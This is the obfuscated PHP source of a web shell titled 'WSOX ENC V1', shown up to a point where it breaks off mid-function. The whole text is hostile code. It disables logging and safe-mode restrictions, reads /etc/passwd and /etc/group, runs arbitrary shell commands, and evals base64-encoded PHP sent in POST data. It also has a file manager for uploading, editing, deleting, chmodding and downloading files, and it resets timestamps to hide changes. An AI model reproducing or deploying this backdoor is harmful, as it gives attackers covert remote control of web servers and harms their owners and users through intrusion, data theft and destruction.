<?php
if (@function_exists("i\x6e\x69_restore")) {
	@ini_restore("log_erro\x72s");
	@ini_restore("er\x72or_log");
	@ini_restore("error_reporti\x6e\x67");
	@ini_restore("disable_f\165nct\151\x6fn");
}
if (@function_exists("ini_set")) {
	@ini_set("log_error\163_max\137len", (int) round(0 + 0));
	@ini_set("e\x72ro\162_log", null);
	@ini_set("log_\145\162\162o\162s", -0565 - 044 + 0631);
	@ini_set("max_execu\x74ion_time", (int) round(0 + 0));
	@ini_set("\x6d\x65mory_limit", "1000M");
	@ini_set("fil\x65_uploa\144s", -042 + -05 + 050);
	@ini_set("safe_mode", 01227 + -0331 + -0676);
	@ini_set("ope\156_b\141sedir", null);
	@ini_set("safe_mode_exec_di\162", "");
	@ini_set("disabl\x65_fu\x6ection", "");
}
if (@function_exists("s\145t_m\x61gic_\161uote\x73_runti\155e")) {
	if (version_compare(phpversion(), "5.4.0", "<")) {
		magic_quotes_runtime(0565 + -0630 + 043);
	}
}
class _uc
{
	public $hsh;
	public $_bve;
	public $_idu;
	public $_asv;
	public $_bvx;
	public $_zb;
	public $_y;
	public $_ahs;
	public $_v;
	public $_a;
	public $_r = [];
	public $_z = [];
	function _jk($_aw, $_lbm)
	{
		$_COOKIE[$_aw] = $_lbm;
		@setcookie($_aw, $_lbm);
	}
	function _gz()
	{
		$this->hsh = "4695c3f6beb7658b";
		$this->_bve =
			"_" .
			substr(
				md5($_SERVER["H\124TP\x5fHO\123T"]),
				-0103 + 034 - -047,
				-030 + 033
			);
		$this->_idu = "#df\065";
		$this->_asv = "UTF\x2d8";
	}
	function _ry()
	{
		if (@function_exists("\151ni_get")) {
			$_v = @ini_get("saf\145_\155ode");
			$_bvx = @ini_get("dis\x61b\154e\137func\x74\x69ons");
		}
		if (!$_v && @function_exists("erro\x72_repor\x74ing")) {
			error_reporting((int) round(0 + 0));
		}
		if (!$_v && @function_exists("s\145t\x5ftime_li\155it")) {
			set_time_limit(022 + 0374 - 0416);
		}
		if (!$_v && @function_exists("i\x67nore\137user_abort")) {
			ignore_user_abort(true);
		}
		if (
			@function_exists("ge\x74_m\141gic_quotes_gpc") &&
			@function_exists("\x73\164ripsla\x73h\145s")
		) {
			if (@get_magic_quotes_gpc()) {
				function _wn($_k)
				{
					foreach ($_k as $_aw => $_lbm) {
						if (is_array($_lbm)) {
							$_k[$_aw] = _wn($_lbm);
						} else {
							$_k[$_aw] = stripslashes($_lbm);
						}
					}
					return $_k;
				}
				$_GET = _wn($_GET);
				$_POST = _wn($_POST);
				$_COOKIE = _wn($_COOKIE);
			}
		}
		define("PE", @function_exists("posix_\x67eteuid"));
		define(
			"WI",
			strtolower(
				substr(PHP_OS, 01467 + -01343 + -0124, (int) round(1 + 1 + 1))
			) == "\x77in"
		);
		if (
			strtolower(
				substr(PHP_OS, (int) round(0 + 0 + 0), (int) round(1 + 1 + 1))
			) == "win"
		) {
			$_a = "wi\156";
		} else {
			$_a = "nix";
		}
		if (!PE && !WI) {
			if (@is_readable("/etc/passwd")) {
				$_yhd = file("/etc\057pa\163swd");
				foreach ($_yhd as $_lbm) {
					$_lbm = explode(":", $_lbm);
					$_r[$_lbm[01044 + 0350 - 01412]] = $_lbm[00 - 00];
				}
			}
			if (@is_readable("/\x65tc\x2f\x67r\x6fup")) {
				$_yhd = file("\057etc/group");
				foreach ($_yhd as $_lbm) {
					$_lbm = explode(":", $_lbm);
					$_z[
						$_lbm[
							(int) round(
								0.66666666666667 +
									0.66666666666667 +
									0.66666666666667
							)
						]
					] = $_lbm[(int) round(0 + 0)];
				}
			}
		}
		$_ahs = $_SERVER["DO\x43UMENT_\x52OOT"];
		if (@function_exists("getcwd")) {
			$_y = @getcwd();
		} else {
			$_y = @dirname(__FILE__);
		}
		if (isset($_POST["c"]) && $_POST["c"] != "") {
			$_POST["c"] = str_rot13($_POST["c"]);
		}
		if (isset($_POST["c"])) {
			if (@function_exists("chdir")) {
				@chdir($_POST["c"]);
			}
		}
		if (@function_exists("getc\x77d")) {
			$_zb = @getcwd();
		} elseif (isset($_POST["c"]) && $_POST["c"] != "") {
			$_zb = $_POST["\x63"];
		} else {
			$_zb = $_y;
		}
		if ($_a == "win") {
			$_y = str_replace("\134", "/", $_y);
			$_zb = str_replace("\134", "/", $_zb);
		}
		if ($_zb[strlen($_zb) - (int) round(0.5 + 0.5)] != "/") {
			$_zb .= "/";
		}
		$this->_bvx = $_bvx;
		$this->_zb = $_zb;
		$this->_y = $_y;
		$this->_ahs = $_ahs;
		$this->_v = $_v;
		$this->_a = $_a;
	}
	function _vi()
	{
		if (!empty($_POST["p"])) {
			$_POST["p"] = @base64_decode($_POST["p"]);
		}
		if (!empty($_POST["p"]) && !empty($_POST["x"])) {
			$this->_jk("\x5fsto", true);
			$_POST["\x70"] .= " 2\076&\061";
		} elseif (!empty($_POST["p"])) {
			$this->_jk("_sto", -0701 - 0176 - -01077);
		}
		echo "<\163cript>if(window.Event) \x77i\156\x64ow.captureEven\x74\163(Ev\145\x6et.KEYDOWN\051\x3bvar cm\144s=n\145w Array('')\x3bvar cur=0;f\165\156ct\151on kp(e)\173\166\x61r n=(w\x69ndow.Event\051 ? e.wh\151ch \072 \x65.k\x65yCode;if\x28\x6e==3\x38\051{cur--;i\x66\050\x63ur\076=0)d\157cument.cf.cmd\x2evalue\x3dcmds[cu\162];elsec\165\x72++;}else\x20if(n==\x34\x30){\x63ur++;if(cur < \x63\155d\x73.length\x29docum\x65\x6et.c\146.\143m\x64.\x76alue=c\155ds[cur];elsecur--;}}\x66unctio\x6e\040add(\143md){c\x6d\144s\056p\157p();c\155ds.pus\x68(cmd);cmd\163.push(''\051;cur\075cm\144s\056l\145\x6egth-\061;\175</script>";
		echo "<h1>Exec</h1><di\166 \143lass=cont\145nt><f\x6fr\x6d \156am\145=cf \157nsubm\x69t=\042if(d.cf.cmd.value=='clear'){d.cf.o\x75tp\x75t.value='';d.cf.\143md.v\x61lue='\x27;\162eturn fa\x6cse;}add(this.cmd\056va\154ue);g(\156\165ll,null,utoa(thi\163.cmd.val\x75e\x29,th\x69s.sho\x77_errors.checked?\x31:\047\x27);return fal\x73e;\x22>";
		echo "<input\x20\x74ype=checkbox nam\x65\x3dshow\137errors value\0751 " .
			(!empty($_POST["x"]) || $_COOKIE["\x5fst\x6f"]
				? "\143hecked"
				: "") .
			">\x20\x72edirect s\x74derr to\040std\157ut (2>&1)</n\x6fbr><br/><textarea \x69d\075taid cl\x61\163s=bigarea name\075outp\x75t style=\x22border-bottom:0;margi\x6e:0;\x22 rea\144only>";
		if (!empty($_POST["p"])) {
			if (!empty($_SESSION["ex"])) {
				echo $_SESSION["ex"];
			}
			$_vqu = _lqyw(
				"\044 " .
					$_POST["p"] .
					"\x0a" .
					_bjab($_POST["\x70"]) .
					"\x0a\012"
			);
			echo $_vqu;
			$_SESSION["ex"] = $_SESSION["ex"] . $_vqu;
		} else {
			unset($_SESSION["ex"]);
		}
		echo "</texta\162ea><\x74\x61\x62\x6ce style=\042bo\162der:1px\x20soli\144 #df5\073backgrou\156d-colo\x72:#55\065;bor\x64\x65r\055\x74op:0px;\042 \x63el\154pa\x64din\147=0 cellspaci\x6eg=0 width\x3d\042100%\x22>\074\164\162><td wi\144t\x68=\0421%\042>\x24</t\144><td><input t\171\160e=tex\164 na\155e\x3dcmd style\x3d\042\142\157rder:0px;width:100%;\042 on\x6beydow\156\x3d\x22k\x70(\145vent);\042></td></t\x72><\057table></form></div>\074scr\151pt\x3ed.\x63f.\143md\x2efocus(); var \x74extar\x20= document.getElementB\x79Id(\042ta\151d\x22); t\145xt\141r.s\143rollTop = texta\x72.\163crollHe\x69ght;</script\x3e";
	}
	function _ksdl()
	{
		echo "<h1>Execution \x50\110\x50\x2dco\144\x65</h\x31\076<div clas\163=content><form n\x61me=pf met\150od=p\157\x73t \x6fnsubmit\075\042g('ph',null,\x75toa(\x74his\056code.value)\x2c'');return\x20false;\x22><\x74\x65xtarea name=code c\x6cass=bigarea id=PhpCode>" .
			(!empty($_POST["p"]) ? _lqyw(@base64_decode($_POST["p"])) : "") .
			"\074/textarea>\074i\x6ep\165t ty\160e=\163u\x62\x6d\151\x74 value=\105val styl\145=\042margin\x2d\164op:5px\x22\x3e";
		echo "\x3c/form><pre id=PhpOutput style=\042" .
			(empty($_POST["p"]) ? "di\x73play\072no\x6ee;" : "") .
			"m\x61rgin\x2dt\157p:5px;\x22 clas\x73=ml1>";
		if (!empty($_POST["p"])) {
			@ob_start();
			eval(@base64_decode($_POST["p"]));
			echo _lqyw(ob_get_clean());
		}
		echo "</pre><\x2fdiv>";
	}
	function _jaq()
	{
		echo "<h1>PH\120 \111\156fo</h1>\074div class=\x63\x6fntent>";
		@ob_start();
		@phpinfo();
		$_pn = str_replace("\074img ", "\074noimg\x20", @ob_get_clean());
		$_xe = substr($_pn, strpos($_pn, "\x3cstyle"));
		$_xe =
			substr($_xe, -016 + 016, strpos($_xe, "</style\x3e")) .
			", p, \164abl\x65,\040th,\x20td {font-size:\0612px}</style>";
		$_xe = str_replace(
			["bo\x64y", "\012", ","],
			["p", " .php\x20", ", \056php "],
			$_xe
		);
		$_xe = @preg_replace(
			"/\134bbackg\x72ou\x6ed\x2dco\154or\134b: #[^;]+?;\x5cs*/",
			"",
			$_xe
		);
		$_xe = @preg_replace(
			"/\134bcolor\134\142: #[^;\x5d+?;\134s*\x2f",
			"",
			$_xe
		);
		$_pn = substr(
			$_pn,
			strpos($_pn, "\x3cbo\x64\x79>") + (-0453 + 074 - -0365)
		);
		$_pn = substr($_pn, 060 - 060, strrpos($_pn, "</body>"));
		$_pn = @preg_replace(
			"/\074\1501>PH\120 C\x72ed\151\164s<\134/h1>.\x2b/ms",
			"",
			$_pn
		);
		echo "<d\151v clas\x73=\x22php\x22>", $_xe, $_pn, "</div>";
		echo "</d\151v>";
	}
	function _eg()
	{
		$_zb = $this->_zb;
		if (!empty($_POST["p"])) {
			$_qr = @filemtime($_POST["c"]);
			switch ($_POST["p"]) {
				case "upl\x6fadFile":
				case "uf":
					if (
						!@move_uploaded_file(
							$_FILES["f"]["tmp_n\141me"],
							$_FILES["f"]["name"]
						)
					) {
						echo "Can't u\160load\x20fi\154e!";
					} elseif ($_qr) {
						@touch($_FILES["f"]["name"], $_qr, $_qr);
					}
					break;
				case "m\153dir":
				case "md":
					if (!@mkdir(str_rot13($_POST["x"]))) {
						echo "Can'\x74 cre\x61t\145 new dir";
					} elseif ($_qr) {
						@touch(str_rot13($_POST["x"]), $_qr, $_qr);
					}
					break;
				case "delete":
				case "de":
					function _mt($_atj)
					{
						$_atj =
							substr($_atj, -(-017 - -020)) == "/"
								? $_atj
								: $_atj . "/";
						if ($_b = @opendir($_atj)) {
							while (($_f = @readdir($_b)) !== false) {
								$_f = $_atj . $_f;
								if (
									@basename($_f) == "\x2e." ||
									@basename($_f) == "."
								) {
									continue;
								}
								$_gyx = @filetype($_f);
								if ($_gyx == "dir") {
									_mt($_f);
								} else {
									@unlink($_f);
								}
							}
							@closedir($_b);
						}
						@rmdir($_atj);
					}
					if (@is_array($_POST["f"])) {
						foreach ($_POST["f"] as $_egw) {
							if ($_egw == "\056\056") {
								continue;
							}
							$_egw = str_rot13(urldecode($_egw));
							if (@is_dir($_egw)) {
								_mt($_egw);
							} else {
								@unlink($_egw);
							}
						};
					}
					break;
			}
			if ($_qr) {
				touch($_POST["c"], $_qr, $_qr);
			}
		}
		echo "\074\150\x31>File\040manager</h1><div class\x3d\143\157nt\145nt><scr\x69p\x74>p_\075x_\x3ds_=\042\x22\073</scrip\164>";
		$_gn = _zhpf(isset($_POST["\143"]) ? $_POST["c"] : $_zb);
		if ($_gn === false) {
			echo "Can't open this fol\144er\x21";
			return;
		}
		global $_q;
		$_q = ["name", 0223 - 0222];
		if (!empty($_POST["p"])) {
			if (
				@preg_match(
					"!\163_(\x5bA-z]\053)_(\134d{\x31})!",
					$_POST["p"],
					$_oat
				)
			) {
				$_q = [
					$_oat[0304 + -0303],
					(int) $_oat[
						(int) round(
							0.66666666666667 +
								0.66666666666667 +
								0.66666666666667
						)
					],
				];
			}
		}
		echo "\x3c\x73crip\164>f\x75nction sa(){\x66o\162(i=0;i<d.files.\145\154\x65\x6dents.len\x67th\073i++)\x69\146(d.\146iles\056elements[i].type=='\x63heckbox')d\x2efil\x65s.el\x65m\x65nt\x73[i].c\150e\x63ked=d.f\x69les\x2eelem\145nts\x5b0].ch\145c\153ed;}</sc\x72ip\164><table width\x3d'100%' \143las\163\x3d'm\141in\047 cell\x73pacing='0' cellp\141ddin\147='2'><f\157\x72m \156ame=file\163 met\x68od=post><t\162><th \167idth='1\063px'><input type=\143heckbox\040on\143lick='sa()' cla\x73s=ch\153b\170>\x3c/th><\x74h w\151dth=\x2740%'>\x3ca href='\x23' onclick='g(\x22fm\042\x2cnull,\x22s_name_" .
			($_q[(int) round(0.5 + 0.5)]
				? (int) round(0 + 0 + 0)
				: 0357 + -0356) .
			"\x22)\x27>Nam\x65</a\x3e<\x2fth><th\076\x3ca href\075\047#' on\x63lick='g(\042\x66m\x22,\x6eul\154,\x22s_s\x69\x7ae_" .
			($_q[0123 + -0122] ? (int) round(0 + 0) : 01643 + -01642) .
			"\x22)'>Size</a>\x3c/th><th\x3e<a href='#' o\156click='g(\042fm\042,nul\x6c,\x22s_modi\x66y_" .
			($_q[(int) round(0.5 + 0.5)]
				? (int) round(0 + 0)
				: 00 - 010 - -011) .
			"\x22)'>Mod\151fy</a><\x2ft\x68><t\x68>\x3ca href='#' o\156click='g(\042fm\042,\156u\154l,\042s\137\x70erm\163_" .
			($_q[(int) round(0.5 + 0.5)]
				? (int) round(0 + 0)
				: (int) round(0.5 + 0.5)) .
			"\042\x29'>Permissi\x6fns\074/a>\x3c/th><th wid\164\x68='20\060\160x'>Acti\x6fns<\057th>\074/tr>";
		$_s = $_une = [];
		$_zmj = count($_gn);
		for ($_ox = 0471 - 0471; $_ox < $_zmj; $_ox++) {
			$_jk = [
				"na\x6de" => $_gn[$_ox],
				"\x70ath" => $_zb . $_gn[$_ox],
				"modif\171" => @date(
					"Y\x2dm-d\040H:i:\x73",
					@filemtime($_zb . $_gn[$_ox])
				),
				"perms" => _bkcv($_zb . $_gn[$_ox]),
				"size" => @filesize($_zb . $_gn[$_ox]),
			];
			if (@is_file($_zb . $_gn[$_ox])) {
				$_une[] = @array_merge($_jk, ["type" => "file"]);
			} elseif (@is_link($_zb . $_gn[$_ox])) {
				$_s[] = @array_merge($_jk, [
					"type" => "\154in\153",
					"\154\151nk" => readlink($_jk["path"]),
				]);
			} elseif (@is_dir($_zb . $_gn[$_ox])) {
				$_s[] = @array_merge($_jk, ["type" => "di\x72"]);
			}
		}
		function _xv($_yhd, $_mtv)
		{
			global $_q;
			if ($_q[(int) round(0 + 0)] != "\x73ize") {
				return @strcmp(
					strtolower($_yhd[$_q[(int) round(0 + 0 + 0)]]),
					strtolower($_mtv[$_q[-065 + -013 - -0100]])
				) *
					($_q[
						(int) round(
							0.33333333333333 +
								0.33333333333333 +
								0.33333333333333
						)
					]
						? (int) round(0.5 + 0.5)
						: -(int) round(
							0.33333333333333 +
								0.33333333333333 +
								0.33333333333333
						));
			} else {
				return ($_yhd["size"] < $_mtv["size"]
					? -(-027 - -0113 + -063)
					: -01146 - -01147) *
					($_q[(int) round(0.5 + 0.5)]
						? (int) round(0.5 + 0.5)
						: -(int) round(
							0.33333333333333 +
								0.33333333333333 +
								0.33333333333333
						));
			}
		}
		@usort($_une, "wCmp");
		@usort($_s, "wCmp");
		$_une = @array_merge($_s, $_une);
		$_pao = (int) round(0 + 0 + 0);
		foreach ($_une as $_egw) {
			$_hzu = str_rot13(urlencode($_egw["nam\145"]));
			echo "<t\162" .
				($_pao ? " cla\x73s=l1" : "") .
				"><td><input type=checkbox na\155e=\x22f[]\x22 \x76a\154ue=\042" .
				$_hzu .
				"\042\x20class=chkbx></td><td><a hr\x65\146=# onclick\075\x22" .
				($_egw["type"] == "file"
					? "g('ft',\156ull,'" .
						$_hzu .
						"', 'view')\x22>" .
						_lqyw($_egw["\156ame"])
					: "g('fm','" .
						str_rot13($_egw["path"]) .
						"\x27);\x22 " .
						(empty($_egw["\154i\x6ek"])
							? ""
							: "title='" . $_egw["link"] . "'") .
						"><b>[ " .
						_lqyw($_egw["\x6eam\145"]) .
						" ]</b\x3e") .
				"</a><\057td\076<td>" .
				($_egw["t\171p\x65"] == "f\x69\154e"
					? _xkmo($_egw["\163ize"])
					: $_egw["typ\x65"]) .
				"<\057td><td>" .
				$_egw["modify"] .
				"\x3c\057td><td>\x3ca href=# onclick=\042g('\146\x74',\156ull,'" .
				$_hzu .
				"','chmod')\x22>" .
				$_egw["p\x65rms"] .
				"<\057td><td\x3e\x3ca href\x3d\042#\x22 onclic\153=\x22g('ft',null,\047" .
				$_hzu .
				"\x27, 'rename')\042>Re\156ame\x3c/\141> <a href=\x22#\042\x20onclick=\x22g(\x27ft',null,'" .
				$_hzu .
				"'\x2c '\164ouch')\x22>\x54o\165ch\x3c\057a>" .
				($_egw["type"] == "file"
					? "\x20<a \150r\145f=\042#\x22 onclic\153=\042g('ft',\x6eull,'" .
						$_hzu .
						"',\x20'e\x64it')\042>Edit</a\076 <a\x20\x68ref=\042#\042 onclick=\x22g\050'\x66t',null,'" .
						$_hzu .
						"', 'dl'\051\x22>Download\x3c/a>"
					: "") .
				"</td><\x2ftr>";
			$_pao = $_pao
				? -0522 + 052 - -0450
				: (int) round(
					0.33333333333333 + 0.33333333333333 + 0.33333333333333
				);
		}
		echo "<tr><td colspan=\067>\x0d\012\011\x09<input ty\160e\075\150i\144den name=a v\x61lue='f\155'\076\015\x0a\x09\011<input\040type\x3dhi\x64de\x6e \156ame=c\040v\141\x6c\x75e='" .
			_lqyw(str_rot13($_zb)) .
			"'>\015\012\011\011\x3cinp\165t ty\x70\x65\x3dhidden na\x6d\145=\x63h v\x61lu\x65=\x27" .
			(isset($_POST["ch"]) ? $_POST["\143h"] : "") .
			"\x27>\x0d\012\011\x09<\163elec\164 name\075'p'\x3e<\157ption \166\141lue\075'de\047>\104el\x65\164e</opti\x6fn></s\145l\145ct>\046n\142sp;\x3cin\x70ut type='submit' val\165e='>>'><\x2ft\144></\164r></form></table></d\151v>";
	}
	function _ng()
	{
		if (isset($_POST["\x70"])) {
			$_POST["p"] = str_rot13(urldecode($_POST["p"]));
		}
		if (isset($_POST["x"])) {
			switch ($_POST["x"]) {
				case "download":
				case "dl":
					if (@is_file($_POST["p"]) && @is_readable($_POST["p"])) {
						@ob_start("\x6fb_gzha\156dler", 010314 - 07701 + 07365);
						@header(
							"C\x6f\x6e\164ent-Dis\160o\163ition\072 attach\155en\x74; \x66ilename=" .
								@basename($_POST["p"])
						);
						if (@function_exists("mim\x65_conte\156t_t\x79pe")) {
							$_gyx = @mime_content_type($_POST["p"]);
							@header("\x43ontent-\124ype: " . $_gyx);
						} else {
							@header(
								"Con\164e\x6e\x74\055Type\x3a appli\143ation/octe\x74-stream"
							);
						}
						$_op = @fopen($_POST["p"], "\x72");
						if ($_op) {
							while (!@feof($_op)) {
								echo @fgets($_op, (int) round(512 + 512));
							}
							@fclose($_op);
						}
					}
					exit();
					break;
				case "m\153file":
					if (!@file_exists($_POST["p"])) {
						$_d = @filemtime($_POST["c"]);
						$_op = @fopen($_POST["p"], "w");
						if ($_op) {
							@fclose($_op);
							if ($_d) {
								@touch($_POST["c"], $_d, $_d);
								@touch($_POST["p"], $_d, $_d);
							}
							$_POST["x"] = "edit";
						}
					}
					break;
			}
		}
		echo "<\x68\x31>File tool\163\x3c/\x681><\x64iv class\075conten\164>";
		if (!@file_exists($_POST["p"])) {
			echo "File not exists";
			return;
		}
		$_dvm = @stat($_POST["p"]);
		if (PE) {
			$_ya = @posix_getpwuid(
				$_tcg[
					(int) round(
						1.3333333333333 + 1.3333333333333 + 1.3333333333333
					)
				]
			);
			$_dzf = $_ya["\156am\145"];
		} elseif (!empty($_r[$_dvm[-01056 - -01062]])) {
			$_dzf = $_r[$_dvm[0753 + 056 - 01025]];
		} else {
			$_dzf = $_dvm[(int) round(2 + 2)];
		}
		if (PE) {
			$_ya = @posix_getgrgid($_dvm[-0717 + 0724]);
			$_cpq = $_ya["name"];
		} elseif (!empty($_z[$_dvm[0752 - -01124 + -02071]])) {
			$_cpq = $_z[$_dvm[-067 + 0237 + -0143]];
		} else {
			$_cpq = $_dvm[024 - 017];
		}
		echo "<span\076Name:</s\160an> " .
			_lqyw(@basename($_POST["p"])) .
			" <span\x3eSize:<\x2fspan> " .
			(@is_file($_POST["p"]) ? _xkmo(@filesize($_POST["p"])) : "\x2d") .
			" <\163pan>Perm\151ss\151\157\156:</\x73pan> " .
			_bkcv($_POST["p"]) .
			" <s\x70\141n>Owne\162/Group\x3a</span> " .
			$_dzf .
			"/" .
			$_cpq .
			"\x3cbr>";
		echo "<\163pan>Chang\x65 time:</span> " .
			@date("Y-m-d \x48\x3ai:s", @filectime($_POST["p"])) .
			"\040<span\x3eAcc\145\163s time:</span>\x20" .
			@date("Y-m\x2dd \x48:i:s", @fileatime($_POST["p"])) .
			" <spa\156>\115o\144i\146y tim\x65:<\057sp\x61n> " .
			@date("Y\x2dm-d \x48:i:\x73", @filemtime($_POST["p"])) .
			"<b\x72><br>";
		if (empty($_POST["x"])) {
			$_POST["\170"] = "vi\x65w";
		}
		if (@is_file($_POST["p"])) {
			$_j = [
				"View",
				"Download",
				"Edit",
				"Chmod",
				"Re\156ame",
				"To\x75ch",
			];
		} else {
			$_j = ["Chmod", "Re\x6eame", "\x54ouch"];
		}
		foreach ($_j as $_lbm) {
			echo "<\141\x20\150r\x65f=# on\143lick\x3d\042g(null,null\x2c'" .
				urlencode(str_rot13($_POST["p"])) .
				"','" .
				@strtolower($_lbm) .
				"')\042>" .
				(@strtolower($_lbm) == $_POST["x"]
					? "<b>\133 " . $_lbm . " ]</\x62>"
					: $_lbm) .
				"</\141> ";
		}
		echo "<br><b\x72>";
		switch ($_POST["x"]) {
			case "v\x69ew":
			case "vw":
				echo "<p\162e class=ml\061\076";
				$_op = @fopen($_POST["p"], "r");
				if ($_op) {
					while (!@feof($_op)) {
						echo _lqyw(
							@fgets(
								$_op,
								(int) round(
									341.33333333333 +
										341.33333333333 +
										341.33333333333
								)
							)
						);
					}
					@fclose($_op);
				}
				echo "</pre>";
				break;
			case "chmod":
			case "cm":
				if (!empty($_POST["s"])) {
					$_yx = (int) round(0 + 0);
					for (
						$_ox =
							strlen($_POST["s"]) -
							(int) round(
								0.33333333333333 +
									0.33333333333333 +
									0.33333333333333
							);
						$_ox >= (int) round(0 + 0);
						--$_ox
					) {
						$_yx +=
							(int) $_POST["s"][$_ox] *
							@pow(
								(int) round(4 + 4),
								strlen($_POST["s"]) -
									$_ox -
									(0246 + -047 - 0176)
							);
					}
					if (!@chmod($_POST["p"], $_yx)) {
						echo "Can'\x74 \x73et\040p\x65rm\151ssion\x73!\074b\162><\x73cript>doc\x75ment.mf.s.va\154ue=\042\x22;</scrip\x74>";
					}
				}
				@clearstatcache();
				echo "<sc\x72i\x70t>s_\075\042\042;</s\x63ri\160\x74><form onsubmit=\x22g(null\054n\x75\x6cl\x2c'" .
					urlencode(str_rot13($_POST["p"])) .
					"',\156ull,this.c\150mod.\166alu\145)\073\x72eturn false;\042><input ty\x70e=text \x6e\141me=chmod value\075\042" .
					substr(
						@sprintf("%o", @fileperms($_POST["p"])),
						-(int) round(2 + 2)
					) .
					"\x22><\x69nput type=s\x75bmit valu\x65=\042\076>\x22></form\x3e";
				break;
			case "edit":
			case "ed":
				if (!@is_writable($_POST["\160"])) {
					echo "File isn't \x77ri\x74eable";
					break;
				}
				if (!empty($_POST["s"])) {
					$_qr = @filemtime($_POST["p"]);
					$_POST["s"] = substr(
						$_POST["\x73"],
						01404 + -0310 + -01073
					);
					$_POST["s"] = @base64_decode($_POST["s"]);
					$_op = @fopen($_POST["p"], "w");
					if ($_op) {
						@fputs($_op, $_POST["s"]);
						@fclose($_op);
						echo "Sav\x65d!\x3cbr><script>s_=\042\042;<\x2fsc\x72ipt>";
					}
				}
				echo "\x3cf\x6frm onsubmit=\x22g(null,null\x2c'" .
					urlencode(str_rot13($_POST["p"])) .
					"',\x27edit','1'\053utoa(\164his\x2e\x74ex\164.valu\145\051);re\164u\162n false\x3b\x22\x3e<textarea name=text \x63l\141\163s=bi\147a\162ea>";
				$_op = @fopen($_POST["p"], "r");
				if ($_op) {
					while (!@feof($_op)) {
						echo _lqyw(@fgets($_op, (int) round(512 + 512)));
					}
					@fclose($_op);
				}
				echo "</textarea><input type=su\142mi\x74 v\x61lue=\042S\x61v\145\x22></form>";
				if ($_qr) {
					@touch($_POST["p"], $_qr, $_qr);
				}
				@clearstatcache();
				break;
			case "ren\x61me":
			case "rn":
				$_d = @filemtime($_POST["c"]);
				if (!empty($_POST["s"])) {
					if (!@rename($_POST["p"], str_rot13($_POST["s"]))) {
						echo "C\141n't rename!<br>";
					} else {
						if ($_d) {
							@touch($_POST["c"], $_d, $_d);
						}
						die(
							"\074s\x63rip\164\x3eg(null,n\165ll,\042" .
								urlencode($_POST["\x73"]) .
								"\x22\054null,\042\x22)</s\143ript>"
						);
					}
				}
				@clearstatcache();
				echo "<form o\x6esub\155it=\042g(null\x2cnull,'" .
					urlencode(str_rot13($_POST["p"])) .
					"',null,rot13(this.na\x6de.\166al\165e)\051;re\164u\x72n false;\x22><in\160ut type=text n\141\155e=name valu\145=\042" .
					_lqyw($_POST["p"]) .
					"\x22\x3e<input type\x3d\x73ubmit value=\042\x3e>\x22></\146\157rm\076";
				break;
			case "touch":
			case "tc":
				if (!empty($_POST["s"])) {
					$_qr = @strtotime($_POST["\163"]);
					if ($_qr) {
						if (!@touch($_POST["p"], $_qr, $_qr)) {
							echo "Fa\x69l!";
						} else {
							echo "T\x6fuched!";
						}
					} else {
						echo "Bad ti\x6de format!";
					}
				}
				@clearstatcache();
				echo "<script\x3es_=\042\042;\074/script><\x66orm o\156submit=\042\x67(null,null,'" .
					urlencode(str_rot13($_POST["p"])) .
					"',null,this.to\165ch.v\x61l\x75e);\x72eturn fal\x73e;\042><in\160ut type=te\x78t name=\x74ou\x63h\x20value=\042" .
					@date("Y-m\055d H:i:s", @filemtime($_POST["p"])) .
					"\x22><input ty\160e=submit val\x75e=\x22>>\x22\076</f\157rm>";
				break;
		}
		echo "<\x2fdiv\x3e";
	}
	function _ds()
	{
		$_idu = $this->_idu;
		$_asv = $this->_asv;
		$_zb = $this->_zb;
		$_y = $this->_y;
		$_ahs = $this->_ahs;
		$_bve = $this->_bve;
		$_v = $this->_v;
		$_a = $this->_a;
		if (empty($_POST["\143\x68"])) {
			$_POST["c\x68"] = $_asv;
		}
		@header(
			"Con\x74ent-Type\x3a \164ext/ht\155l; chars\145t=" . $_POST["ch"]
		);
		echo "<html><head><m\145\x74\141 http-equ\151v\x3d'Conten\x74-\x54ype'\x20content=\047text/html; cha\x72set=" .
			$_POST["ch"] .
			"\047><title\076" .
			$_SERVER["HT\x54P_HOST"] .
			" - WSOX\x20ENC V1</title>\x0d\012\011\x09<st\171le>bod\x79{backgro\x75nd-\143olor:#4\0644;col\x6fr:#e1e1e1;}bo\x64y,td\054th{\x66ont:\x209pt \114\x75ci\144\x61,Verda\x6ea;marg\x69n:\x30;vertical-align:\164op;color:#e1e1e1;}\164able.inf\x6f{colo\162:#fff;bac\153ground-\x63olor:#22\x32;}span,h1,a{colo\x72\x3a " .
			$_idu .
			" !important;}spa\156{font-we\151ght: bolder;}spa\x6e.wfw{f\157nt-weight:normal;}\1501{bor\x64er-left:5px solid " .
			$_idu .
			";pad\144\x69ng: 2px \x35px;font:\04014pt Verdana\073background-c\x6flor\x3a#222\073margin:0px;}div.conten\x74{padding: 5p\170;margin-left:5px;\x62ackground-\x63olor:\043333;\x7da{text-decorat\x69\157n:none;}a:ho\166\145r{text-deco\162\x61ti\x6fn:under\154i\x6ee;}\x2e\155l1{border:1px solid #444\x3bpadding:5px\073m\x61r\147in:\x30;overflo\x77: auto;}.biga\162ea{wid\164h:100%;hei\147ht:400p\x78\x3b}input,texta\162e\141,se\154ect{margi\156:0;c\157lor:#fff\x3bback\x67round-color:#555;b\157rder:1px s\x6flid " .
			$_idu .
			"; fon\x74: \x39\x70\164 Mon\157sp\x61ce,'C\x6furier N\x65w';\175\146orm{margin:0px;}#\x74oolsTbl{t\145xt-alig\x6e\072ce\156te\162;}.toolsI\156p{width:5\x300px\175.\x6dain t\x68{text-align\x3aleft;\x62ackg\x72ound\055\x63olo\162:#\065e5e5e;}.main t\x72:hov\145r{b\141\143kgroun\x64-c\157lor:#5e5e\065e}.l1{background-colo\x72:#444}.l\062{bac\x6bg\162oun\x64-colo\162:#333}p\x72e{font\055fa\x6d\151ly\x3aC\157ur\x69\145r,M\x6fno\163pa\x63\x65;\x7d</style>\015\x0a<s\x63ript>\015\012var \143_ \075 '" .
			_lqyw(str_rot13($_zb)) .
			"';\015\012\166ar \x61_ =\040'" .
			_lqyw($_POST["a"]) .
			"'\x0d\x0avar ch_ = '" .
			_lqyw($_POST["ch"]) .
			"';\x0d\012var p_ = '" .
			(strpos($_POST["p"], "\012") !== false
				? ""
				: _lqyw($_POST["p"], -064 - -067)) .
			"';\015\012var x_ = '" .
			(strpos($_POST["x"], "\x0a") !== false
				? ""
				: _lqyw($_POST["x"], -0245 - -0250)) .
			"';\015\x0a\x76ar s_ = '" .
			(strpos($_POST["s"], "\012") !== false
				? ""
				: _lqyw($_POST["s"], (int) round(1.5 + 1.5))) .
